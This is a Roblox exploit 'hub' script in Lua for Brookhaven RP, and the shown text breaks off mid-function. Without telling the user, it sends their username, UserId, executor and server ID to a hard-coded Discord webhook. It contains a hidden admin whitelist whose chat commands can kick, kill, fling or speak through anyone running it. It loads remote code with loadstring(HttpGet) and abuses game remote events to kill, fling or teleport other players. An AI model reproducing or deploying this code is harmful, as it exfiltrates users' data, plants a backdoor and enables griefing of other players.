local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local Humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
local NoclipActived = false

LocalPlayer.CharacterAdded:Connect(function(character)
    Humanoid = character:WaitForChild("Humanoid")
end)

local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local WebhookURL = "https://discord.com/api/webhooks/1415725844298600468/n0cKpHi1ENEcDasYWHgMi9CvwC-0TmF5bD02HoCxLkNPdQpYOLIsN5WLuNNKnwDjjnf1"

local function ExecuteLog()
    local placeId = game.PlaceId
    local jobId = game.JobId
    local userId = LocalPlayer.UserId
    local serverLink = "https://www.roblox.com/games/" .. placeId .. "?jobId=" .. jobId
    local dataHora = os.date("%d/%m/%Y %H:%M:%S")

    local data = {
        embeds = {{
            title = "ü§´ Um chupa lolas executou o Hub!",
            color = 65280,
            fields = {
                {name = "üìÖ Data", value = dataHora, inline = false},
                {name = "üéÆ Jogo", value = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name, inline = false},
                {name = "üë§ Jogador", value = LocalPlayer.Name, inline = false},
                {name = "üÜî UserId", value = tostring(userId), inline = false},
                {name = "üíª Executor", value = identifyexecutor and identifyexecutor() or "Desconhecido", inline = false},
                {name = "üåê Server JobId", value = jobId, inline = false},
                {name = "üìå Teleport", value = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..placeId..", \""..jobId.."\")", inline = false},
                {name = "üìù Nome do Jogador", value = LocalPlayer.Name, inline = false},
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    request({
        Url = WebhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = body
    })
end

ExecuteLog()

whitelistAdm = {
    ["ronia_oys"] = true,
    ["murilo_12303"] = true,
    ["ixi362"] = true,
    ["adm_hub6"] = true,
    ["cantanguandi2"] = true,
    ["souoluis_perdiaconta"] = true,
    ["oiiikk97"] = true,
    ["fgzinzzz"] = true,
    ["pedrorjgm11"] = true,
    ["jxtacb"] = true,
    ["TrollLolXD666"] = true,
    ["nandooliverytu"] = true,
    ["toddynho19654"] = true,
    ["vendade_brainrot"] = true,
    ["BloxZera_121"] = true,
    ["Marcelo1p620"] = true,
    ["kanakiwhakO"] = true,
    ["bacon_wd3"] = true,
}
if whitelistAdm[LocalPlayer.Name] then
    local SelectedPlayer
	local playerNames = {}
	local function ChatGlobal(msg)
    pcall(function()
        local tcs = game:GetService("TextChatService")
        if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
            local channel = tcs.TextChannels.RBXGeneral
            if channel then channel:SendAsync(msg) end
        else
            game:GetService("ReplicatedStorage")
                .DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg,"All")
        end
    end)
end

local function ExecutarComando(msgText, autor)
    if not Donos[autor:lower()] then
        return
    end

    local playerName = LocalPlayer.Name:lower()
    local character = LocalPlayer.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    local root = character and character:FindFirstChild("HumanoidRootPart")

    local function isCmd(cmd) return msgText:match(";"..cmd.."%s+"..playerName) end

    if isCmd("kick") then
        LocalPlayer:Kick("Voc√™ foi removido pelo Lyra  Hub.")
    elseif isCmd("kill") and character then
        character:BreakJoints()
    elseif isCmd("killplus") and character and root then
        character:BreakJoints()
        for i = 1, 10 do
            local part = Instance.new("Part")
            part.Size = Vector3.new(10,10,10)
            part.Anchored = false
            part.CanCollide = false
            part.Material = Enum.Material.Neon
            part.BrickColor = BrickColor.Random()
            part.CFrame = root.CFrame
            part.Parent = workspace
            local bv = Instance.new("BodyVelocity")
            bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
            bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
            bv.Parent = part
            game.Debris:AddItem(part, 3)
        end
    elseif isCmd("fling") and root then
        TweenService:Create(
            root,
            TweenInfo.new(2, Enum.EasingStyle.Linear),
            {CFrame = CFrame.new(50000, 5000000, 3972823)}
        ):Play()
    elseif isCmd("freeze") and humanoid and root then
        humanoid.WalkSpeed = 0
        root.Anchored = true
    elseif msgText:match(";chat%s+" .. playerName) then
        local msg = msgText:gsub(";chat%s+" .. playerName, ""):gsub("^%s+", "")
        if msg ~= "" then ChatGlobal(msg) end
    elseif msgText:match(";verifique") then
        ChatGlobal("LyraLap-" .. math.random(1000,9999))
    elseif isCmd("bring") and root then
        local autorPlayer = Players:FindFirstChild(autor)
        if autorPlayer and autorPlayer.Character and autorPlayer.Character:FindFirstChild("HumanoidRootPart") then
            root.CFrame = autorPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
        end
    elseif isCmd("jail") and root and not Jails[playerName] then
        Jails[playerName] = CriarCela(root)
        root.Anchored = true
        if humanoid then humanoid.WalkSpeed = 0 end
    elseif isCmd("unjail") and Jails[playerName] then
        Jails[playerName]:Destroy()
        Jails[playerName] = nil
        root.Anchored = false
        if humanoid then humanoid.WalkSpeed = 16 end
    end
end

local tcs = game:GetService("TextChatService")
if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
    tcs.OnIncomingMessage = function(message)
        if message.TextSource then
            ExecutarComando(message.Text:lower(), message.TextSource.Name)
        end
    end
else
    Players.PlayerChatted:Connect(function(player, msg)
        ExecutarComando(msg:lower(), player.Name)
    end)
end

	
	for _, player in pairs(Players:GetPlayers()) do
	    table.insert(playerNames, player.Name)
	end
	
	local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
	local Window = WindUI:CreateWindow({
	    Title = "Lyra Hub Adm - Brookhaven RP",
	    Icon = "shield-user",
	    Author = "by Cukidworkidevi",
	    Folder = "Sla",
	    Size = UDim2.fromOffset(600, 480),
	    Transparent = true,
	    Theme = "Midnight",
	    Resizable = true,
	    SideBarWidth = 210,
	    BackgroundImageTransparency = 0.35,
	    HideSearchBar = false,
	    ScrollBarEnabled = true,
	    Background = "rbxassetid://9142678957",
	})
	
	local Section1 = Window:Section({Title = "Painel administrador", Icon = "monitor", Opened = true})
	local Tab1 = Section1:Tab({Title = "Fun√ß√µes", Icon = "hammer", Locked = false})
	local Section2 = Tab1:Section({Title = "Comandos", Icon = "album", Opened = true})
	
	-- Dropdown de jogadores
	local PlayersDD = Section2:Dropdown({
	    Title = "Jogadores",
	    Values = playerNames,
	    Value = playerNames[1],
	    Callback = function(option)
	        SelectedPlayer = Players:FindFirstChild(option)
	    end
	})
	
	Players.PlayerAdded:Connect(function(player)
	    table.insert(playerNames, player.Name)
	    PlayersDD:Refresh(playerNames)
	end)
	
	Players.PlayerRemoving:Connect(function(player)
	    for i, name in pairs(playerNames) do
	        if name == player.Name then
	            table.remove(playerNames, i)
	            break
	        end
	    end
	    PlayersDD:Refresh(playerNames)
	end)
	
	-- Fun√ß√£o para enviar comandos
	local function SendCommand(msg)
	    local tcs = game:GetService("TextChatService")
	    if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
	        local channel = tcs.TextChannels.RBXGeneral
	        if channel then
	            channel:SendAsync(msg)
	        end
	    else
	        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg,"All")
	    end
	end
	
	-- Comandos padr√£o
	local commands = {
	    {Title = "Verificar", Desc = "Verifica todas as pessoas com o Hub", Global = true, Cmd = ";verifique"},
	    {Title = "Bring", Desc = "Teleporta o jogador at√© voc√™", Cmd = ";bring"},
	    {Title = "Freeze", Desc = "Congela o jogador", Cmd = ";freeze"},
	    {Title = "Fling", Desc = "Joga o jogador pra longe", Cmd = ";fling"},
	    {Title = "Kick", Desc = "Expulsa o jogador", Cmd = ";kick"},
	    {Title = "Kill", Desc = "Mata o jogador", Cmd = ";kill"},
	    {Title = "KillPlus", Desc = "Mata o jogador com efeitos extras", Cmd = ";killplus"},
	    {Title = "Jail", Desc = "Prende o jogador", Cmd = ";jail"},
	    {Title = "Unjail", Desc = "Solta o jogador", Cmd = ";unjail"},
	}
	
	for _, cmd in pairs(commands) do
	    Section2:Button({
	        Title = cmd.Title,
	        Desc = cmd.Desc,
	        Locked = false,
	        Callback = function()
	            if not cmd.Global and not SelectedPlayer then
	                warn("Selecione um jogador primeiro!")
	                return
	            end
	            local message = cmd.Cmd
	            if not cmd.Global then
	                message = message .. " " .. SelectedPlayer.Name
	            end
	            SendCommand(message)
	        end
	    })
	end
	
	-- Input de chat
	local ChatMessage = ""
	Section2:Input({
	    Title = "Mensagem para enviar",
	    Desc = "Digite a mensagem pro chat",
	    Value = "",
	    Placeholder = "Digite a mensagem...",
	    InputIcon = "message-circle",
	    Type = "Input",
	    Callback = function(msg)
	        ChatMessage = msg
	    end
	})
	
	
	Section2:Button({
	    Title = "Enviar Chat",
	    Desc = "Envia a mensagem digitada como se fosse o jogador:P",
	    Locked = false,
	    Callback = function()
	        if not SelectedPlayer then
	            warn("Selecione um jogador primeiro!")
	            return
	        end
	        if not ChatMessage or ChatMessage == "" then
	            warn("Digite uma mensagem primeiro!")
	            return
	        end
	        SendCommand(";chat " .. SelectedPlayer.Name .. " " .. ChatMessage)
	    end
    })
end

local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/slatosemideias/lyra-hub-tema-/refs/heads/main/Main.txt"))()

local Window = redzlib:MakeWindow({
    Title = "Lyra Hub | Brookhaven RP",
    SubTitle = "By Ks888",
    SaveFolder = "Lyra Hub | New Gen"
})


Window:AddMinimizeButton({
    Button = { Image = "rbxassetid://132210732097302", BackgroundTransparency = 0 },
    Corner = { CornerRadius = UDim.new(35, 1) },
})

local MainTab = Window:MakeTab({"Main", "home"})

MainTab:AddSection({"„ÄãInformations"})

MainTab:AddParagraph({"Ui", "‚Ä¢ CuKidWorkiDevi\n‚Ä¢ Shadow"})
MainTab:AddParagraph({"Fun√ß√µes", "‚Ä¢ CuKidWorkiDevi\n‚Ä¢ Shadow"})
MainTab:AddParagraph({"Hub original", "‚Ä¢ Cudiworkidev\n‚Ä¢ Lyra Hub Discord"})
MainTab:AddParagraph({"Aviso", "‚Ä¢ Se bugar √© s√≥ resetar"})

MainTab:AddDiscordInvite({
    Name = "Lyra Hub Community",
    Description = "Mais de 200 membros se junte agora!",
    Logo = "rbxassetid://",
    Invite = "https://discord.gg/h3Cwr6cZ",
})

local PlayerTab = Window:MakeTab({"Local Player", "user"})

PlayerTab:AddSection({"„ÄãPlayer Configs"})

PlayerTab:AddSlider({
    Name = "Speed",
    Min = 1,
    Max = 5000,
    Increase = 1,
    Default = 16,
    Callback = function(Value)
        if Humanoid then
            Humanoid.WalkSpeed = Value
        end
    end
})

PlayerTab:AddSlider({
    Name = "Jump Power",
    Min = 1,
    Max = 5000,
    Increase = 1,
    Default = 50,
    Callback = function(Value)
        if Humanoid then
            Humanoid.JumpPower = Value
        end
    end
})

PlayerTab:AddSlider({
    Name = "Gravity",
    Min = 1,
    Max = 500,
    Increase = 1,
    Default = 196,
    Callback = function(Value)
        workspace.Gravity = Value
    end
})

PlayerTab:AddButton({
    Name = "Reset All",
    Callback = function()
        workspace.Gravity = 196.2
        if Humanoid then
            Humanoid.JumpPower = 50
            Humanoid.WalkSpeed = 16
        end
    end
})

PlayerTab:AddToggle({
    Name = "Noclip",
    Default = false,
    Callback = function(v)
        NoclipActived = v
    end
})

RunService.Stepped:Connect(function()
    if NoclipActived and LocalPlayer.Character then
        for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
            if part:IsA("BasePart") and part.CanCollide then
                part.CanCollide = false
            end
        end
    end
end)

local function getPlayerNames()
    local names = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            table.insert(names, player.Name)
        end
    end
    return names
end

local PlayerNames = getPlayerNames()
local selectedPlayerName = PlayerNames[1] or ""
local selectedMethod = "All Server"

PlayerTab:AddSection({"„ÄãSERVER"})

local PlayerDropdown = PlayerTab:AddDropdown({
    Name = "Select Player",
    Description = "Choose a player from the list",
    Options = PlayerNames,
    Default = selectedPlayerName,
    Callback = function(Value)
        selectedPlayerName = Value
    end
})

local MethodDropdown = PlayerTab:AddDropdown({
    Name = "Select Method",
    Description = "Choose which method to execute",
    Options = {"All Server", "Single Player"},
    Default = "All Server",
    Callback = function(Value)
        selectedMethod = Value
    end
})

PlayerTab:AddButton({
    Name = "Update players Lits",
    Callback = function()
        PlayerNames = getPlayerNames()
    end
})

local isExecuting = false

PlayerTab:AddButton({
    Name = "Execute Selected Method",
    Callback = function()
        if isExecuting then
            return
        end
        
        isExecuting = true
        
        local RE = ReplicatedStorage:WaitForChild("RE")
        local ClearEvent = RE:FindFirstChild("1Clea1rTool1s")
        local ToolEvent = RE:FindFirstChild("1Too1l")
        local FireEvent = RE:FindFirstChild("1Gu1n")

        local function clearAllTools()
            if ClearEvent then
                ClearEvent:FireServer("ClearAllTools")
            end
        end

        local function getAssault()
            if ToolEvent then
                local success, result = pcall(function()
                    return ToolEvent:InvokeServer("PickingTools", "Assault")
                end)
                if not success then
                end
            end
        end

        local function hasAssault()
            return LocalPlayer.Backpack:FindFirstChild("Assault") ~= nil
        end

        local function fireAtPart(targetPart, vectorSize)
            local gunScript = LocalPlayer.Backpack:FindFirstChild("Assault")
                and LocalPlayer.Backpack.Assault:FindFirstChild("GunScript_Local")

            if not gunScript or not targetPart or not FireEvent then 
                return false
            end

            local success, result = pcall(function()
                local args = {
                    targetPart,
                    targetPart,
                    vectorSize,
                    targetPart.Position,
                    gunScript:FindFirstChild("MuzzleEffect"),
                    gunScript:FindFirstChild("HitEffect"),
                    0,
                    0,
                    { false },
                    {
                        25,
                        Vector3.new(1000, 1000, 1000),
                        BrickColor.new(29),
                        0.25,
                        Enum.Material.SmoothPlastic,
                        0.25
                    },
                    true,
                    false
                }
                FireEvent:FireServer(unpack(args))
            end)
            
            if not success then
            end
            
            return success
        end

        local function executeMethod(times)
            for i = 1, times do
                if selectedMethod == "All Server" then
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            fireAtPart(player.Character.HumanoidRootPart, Vector3.new(9e16, 9e16, 9e16))
                            task.wait(0.1)
                        end
                    end
                elseif selectedMethod == "Single Player" and selectedPlayerName and selectedPlayerName ~= "" then
                    local targetPlayer = Players:FindFirstChild(selectedPlayerName)
                    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        fireAtPart(targetPlayer.Character.HumanoidRootPart, Vector3.new(9e16, 9e16, 9e16))
                        task.wait(0.1)
                    else
                    end
                end
            end
        end

        task.spawn(function()
            local attempts = 0
            local maxAttempts = 10
            
            while isExecuting and attempts < maxAttempts do
                attempts = attempts + 1
                
                clearAllTools()
                task.wait(0.5)
                getAssault()

                local waitTime = 0
                repeat
                    task.wait(0.2)
                    waitTime = waitTime + 0.2
                until hasAssault() or waitTime > 5

                if hasAssault() then
                    executeMethod(3)
                else
                end

                task.wait(1)
            end
            
            isExecuting = false
        end)
    end
})

PlayerTab:AddButton({
    Name = "Stop Select Method",
    Callback = function()
        isExecuting = false
    end
})


local Tab = Window:MakeTab({"Troll ", "bomb"})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInputManager = game:GetService("VirtualInputManager")
local RunService = game:GetService("RunService")
local cam = workspace.CurrentCamera

local selectedPlayerName = nil
local methodKill = nil
getgenv().Target = nil
local Character = LocalPlayer.Character
local Humanoid = Character and Character:WaitForChild("Humanoid")
local RootPart = Character and Character:WaitForChild("HumanoidRootPart")

local function cleanupCouch()
    local char = LocalPlayer.Character
    if char then
        local couch = char:FindFirstChild("Couch") or LocalPlayer.Backpack:FindFirstChild("Couch")
        if couch then
            couch:Destroy()
        end
    end
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
end

LocalPlayer.CharacterAdded:Connect(function(newCharacter)
    Character = newCharacter
    Humanoid = newCharacter:WaitForChild("Humanoid")
    RootPart = newCharacter:WaitForChild("HumanoidRootPart")
    cleanupCouch()
    
    Humanoid.Died:Connect(function()
        cleanupCouch()
    end)
end)

if Humanoid then
    Humanoid.Died:Connect(function()
        cleanupCouch()
    end)
end

local function KillPlayerCouch()
    if not selectedPlayerName then
        return
    end
    local target = Players:FindFirstChild(selectedPlayerName)
    if not target or not target.Character then
        return
    end

    local char = LocalPlayer.Character
    if not char then
        return
    end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if not hum or not root or not tRoot then
        return
    end

    local originalPos = root.Position 
    local sitPos = Vector3.new(145.51, -350.09, 21.58)

    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
    task.wait(0.2)

    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
    task.wait(0.3)

    local tool = LocalPlayer.Backpack:FindFirstChild("Couch")
    if tool then tool.Parent = char end
    task.wait(0.1)

    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game)
    task.wait(0.1)

    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    hum.PlatformStand = false
    cam.CameraSubject = target.Character:FindFirstChild("Head") or tRoot or hum

    local align = Instance.new("BodyPosition")
    align.Name = "BringPosition"
    align.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    align.D = 10
    align.P = 30000
    align.Position = root.Position
    align.Parent = tRoot

    task.spawn(function()
        local angle = 0
        local startTime = tick()
        while tick() - startTime < 5 and target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") do
            local tHum = target.Character:FindFirstChildOfClass("Humanoid")
            if not tHum or tHum.Sit then break end

            local hrp = target.Character.HumanoidRootPart
            local adjustedPos = hrp.Position + (hrp.Velocity / 1.5)

            angle += 50
            root.CFrame = CFrame.new(adjustedPos + Vector3.new(0, 2, 0)) * CFrame.Angles(math.rad(angle), 0, 0)
            align.Position = root.Position + Vector3.new(2, 0, 0)

            task.wait()
        end

        align:Destroy()
        hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        hum.PlatformStand = false
        cam.CameraSubject = hum

        for _, p in pairs(char:GetDescendants()) do
            if p:IsA("BasePart") then
                p.Velocity = Vector3.zero
                p.RotVelocity = Vector3.zero
            end
        end

        task.wait(0.1)
        root.CFrame = CFrame.new(sitPos)
        task.wait(0.3)

        local tool = char:FindFirstChild("Couch")
        if tool then tool.Parent = LocalPlayer.Backpack end

        task.wait(0.01)
        ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
        task.wait(0.2)
        root.CFrame = CFrame.new(originalPos)
    end)
end

local function BringPlayerLLL()
    if not selectedPlayerName then
        return
    end
    local target = Players:FindFirstChild(selectedPlayerName)
    if not target or not target.Character then
        return
    end

    local char = LocalPlayer.Character
    if not char then
        return
    end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if not hum or not root or not tRoot then
        return
    end

    local originalPos = root.Position 
    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
    task.wait(0.2)

    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
    task.wait(0.3)

    local tool = LocalPlayer.Backpack:FindFirstChild("Couch")
    if tool then
        tool.Parent = char
    end
    task.wait(0.1)

    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game)
    task.wait(0.1)

    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
    hum.PlatformStand = false
    cam.CameraSubject = target.Character:FindFirstChild("Head") or tRoot or hum

    local align = Instance.new("BodyPosition")
    align.Name = "BringPosition"
    align.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    align.D = 10
    align.P = 30000
    align.Position = root.Position
    align.Parent = tRoot

    task.spawn(function()
        local angle = 0
        local startTime = tick()
        while tick() - startTime < 5 and target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") do
            local tHum = target.Character:FindFirstChildOfClass("Humanoid")
            if not tHum or tHum.Sit then break end

            local hrp = target.Character.HumanoidRootPart
            local adjustedPos = hrp.Position + (hrp.Velocity / 1.5)

            angle += 50
            root.CFrame = CFrame.new(adjustedPos + Vector3.new(0, 2, 0)) * CFrame.Angles(math.rad(angle), 0, 0)
            align.Position = root.Position + Vector3.new(2, 0, 0)

            task.wait()
        end

        align:Destroy()
        hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        hum.PlatformStand = false
        cam.CameraSubject = hum

        for _, p in pairs(char:GetDescendants()) do
            if p:IsA("BasePart") then
                p.Velocity = Vector3.zero
                p.RotVelocity = Vector3.zero
            end
        end

        task.wait(0.1)
        root.Anchored = true
        root.CFrame = CFrame.new(originalPos)
        task.wait(0.001)
        root.Anchored = false

        task.wait(0.7)
        local tool = char:FindFirstChild("Couch")
        if tool then
            tool.Parent = LocalPlayer.Backpack
        end

        task.wait(0.001)
        ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
    end)
end

local function BringWithCouch()
    local targetPlayer = Players:FindFirstChild(getgenv().Target)
    if not targetPlayer then
        return
    end
    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        return
    end

    local args = { [1] = "ClearAllTools" }
    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer(unpack(args))
    local args = { [1] = "PickingTools", [2] = "Couch" }
    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))

    local couch = LocalPlayer.Backpack:WaitForChild("Couch", 2)
    if not couch then
        return
    end

    couch.Name = "Couch"
    local seat1 = couch:FindFirstChild("Seat1")
    local seat2 = couch:FindFirstChild("Seat2")
    local handle = couch:FindFirstChild("Handle")
    if seat1 and seat2 and handle then
        seat1.Disabled = true
        seat2.Disabled = true
        handle.Name = "Handle "
    else
        return
    end
    couch.Parent = LocalPlayer.Character

    local tet = Instance.new("BodyVelocity", seat1)
    tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    tet.P = 1250
    tet.Velocity = Vector3.new(0, 0, 0)
    tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"

    repeat
        for m = 1, 35 do
            local pos = { x = 0, y = 0, z = 0 }
            local tRoot = targetPlayer.Character and targetPlayer.Character.HumanoidRootPart
            if not tRoot then break end
            pos.x = tRoot.Position.X + (tRoot.Velocity.X / 2)
            pos.y = tRoot.Position.Y + (tRoot.Velocity.Y / 2)
            pos.z = tRoot.Position.Z + (tRoot.Velocity.Z / 2)
            seat1.CFrame = CFrame.new(Vector3.new(pos.x, pos.y, pos.z)) * CFrame.new(-2, 2, 0)
            task.wait()
        end
        tet:Destroy()
        couch.Parent = LocalPlayer.Backpack
        task.wait()
        couch:FindFirstChild("Handle ").Name = "Handle"
        task.wait(0.2)
        couch.Parent = LocalPlayer.Character
        task.wait()
        couch.Parent = LocalPlayer.Backpack
        couch.Handle.Name = "Handle "
        task.wait(0.2)
        couch.Parent = LocalPlayer.Character
        tet = Instance.new("BodyVelocity", seat1)
        tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        tet.P = 1250
        tet.Velocity = Vector3.new(0, 0, 0)
        tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
    until targetPlayer.Character and targetPlayer.Character.Humanoid and targetPlayer.Character.Humanoid.Sit == true
    task.wait()
    tet:Destroy()
    couch.Parent = LocalPlayer.Backpack
    task.wait()
    couch:FindFirstChild("Handle ").Name = "Handle"
    task.wait(0.3)
    couch.Parent = LocalPlayer.Character
    task.wait(0.3)
    couch.Grip = CFrame.new(Vector3.new(0, 0, 0))
    task.wait(0.3)
    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")
end

local function KillWithCouch()
    local targetPlayer = Players:FindFirstChild(getgenv().Target)
    if not targetPlayer then
        return
    end
    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        return
    end

    local args = { [1] = "ClearAllTools" }
    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer(unpack(args))
    local args = { [1] = "PickingTools", [2] = "Couch" }
    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))

    local couch = LocalPlayer.Backpack:WaitForChild("Couch", 2)
    if not couch then
        return
    end

    couch.Name = "Couch"
    local seat1 = couch:FindFirstChild("Seat1")
    local seat2 = couch:FindFirstChild("Seat2")
    local handle = couch:FindFirstChild("Handle")
    if seat1 and seat2 and handle then
        seat1.Disabled = true
        seat2.Disabled = true
        handle.Name = "Handle "
    else
        return
    end
    couch.Parent = LocalPlayer.Character

    local tet = Instance.new("BodyVelocity", seat1)
    tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    tet.P = 1250
    tet.Velocity = Vector3.new(0, 0, 0)
    tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"

    repeat
        for m = 1, 35 do
            local pos = { x = 0, y = 0, z = 0 }
            local tRoot = targetPlayer.Character and targetPlayer.Character.HumanoidRootPart
            if not tRoot then break end
            pos.x = tRoot.Position.X + (tRoot.Velocity.X / 2)
            pos.y = tRoot.Position.Y + (tRoot.Velocity.Y / 2)
            pos.z = tRoot.Position.Z + (tRoot.Velocity.Z / 2)
            seat1.CFrame = CFrame.new(Vector3.new(pos.x, pos.y, pos.z)) * CFrame.new(-2, 2, 0)
            task.wait()
        end
        tet:Destroy()
        couch.Parent = LocalPlayer.Backpack
        task.wait()
        couch:FindFirstChild("Handle ").Name = "Handle"
        task.wait(0.2)
        couch.Parent = LocalPlayer.Character
        task.wait()
        couch.Parent = LocalPlayer.Backpack
        couch.Handle.Name = "Handle "
        task.wait(0.2)
        couch.Parent = LocalPlayer.Character
        tet = Instance.new("BodyVelocity", seat1)
        tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        tet.P = 1250
        tet.Velocity = Vector3.new(0, 0, 0)
        tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
    until targetPlayer.Character and targetPlayer.Character.Humanoid and targetPlayer.Character.Humanoid.Sit == true
    task.wait()
    couch.Parent = LocalPlayer.Backpack
    seat1.CFrame = CFrame.new(Vector3.new(9999, -450, 9999))
    seat2.CFrame = CFrame.new(Vector3.new(9999, -450, 9999))
    couch.Parent = LocalPlayer.Character
    task.wait(0.1)
    couch.Parent = LocalPlayer.Backpack
    task.wait(2)
    local bv = seat1:FindFirstChild("#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W")
    if bv then bv:Destroy() end
    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer("ClearAllTools")
end


local function getPlayerList()
    local players = Players:GetPlayers()
    local playerNames = {}
    for _, player in ipairs(players) do
        if player ~= LocalPlayer then
            table.insert(playerNames, player.Name)
        end
    end
    return playerNames
end

local function playerCorrupt()
    local targetPlayer = Players:FindFirstChild(getgenv().Target)
    if not targetPlayer then
        return
    end
    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
        return
    end

    local args = { [1] = "ClearAllTools" }
    ReplicatedStorage.RE["1Clea1rTool1s"]:FireServer(unpack(args))
    local args = { [1] = "PickingTools", [2] = "Couch" }
    ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))

    local couch = LocalPlayer.Backpack:WaitForChild("Couch", 2)
    if not couch then
        return
    end

    couch.Name = "Couch"
    local seat1 = couch:FindFirstChild("Seat1")
    local seat2 = couch:FindFirstChild("Seat2")
    local handle = couch:FindFirstChild("Handle")
    if seat1 and seat2 and handle then
        seat1.Disabled = true
        seat2.Disabled = true
        handle.Name = "Handle "
    else
        return
    end
    couch.Parent = LocalPlayer.Character

    local tet = Instance.new("BodyVelocity", seat1)
    tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    tet.P = 1250
    tet.Velocity = Vector3.new(0, 0, 0)
    tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"

    repeat
        for m = 1, 35 do
            local pos = { x = 0, y = 0, z = 0 }
            local tRoot = targetPlayer.Character and targetPlayer.Character.HumanoidRootPart
            if not tRoot then break end
            pos.x = tRoot.Position.X + (tRoot.Velocity.X / 2)
            pos.y = tRoot.Position.Y + (tRoot.Velocity.Y / 2)
            pos.z = tRoot.Position.Z + (tRoot.Velocity.Z / 2)
            seat1.CFrame = CFrame.new(Vector3.new(pos.x, pos.y, pos.z)) * CFrame.new(-2, 2, 0)
            task.wait()
        end
        tet:Destroy()
        couch.Parent = LocalPlayer.Backpack
        task.wait()
        couch:FindFirstChild("Handle ").Name = "Handle"
        task.wait(0.2)
        couch.Parent = LocalPlayer.Character
        task.wait()
        couch.Parent = LocalPlayer.Backpack
        couch.Handle.Name = "Handle "
        task.wait(0.2)
        couch.Parent = LocalPlayer.Character
        tet = Instance.new("BodyVelocity", seat1)
        tet.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        tet.P = 1250
        tet.Velocity = Vector3.new(0, 0, 0)
        tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
    until targetPlayer.Character and targetPlayer.Character.Humanoid and targetPlayer.Character.Humanoid.Sit == true
    task.wait()
    couch.Parent = LocalPlayer.Backpack
    seat1.CFrame = CFrame.new(Vector3.new(0/0, 0/0, 0/0))
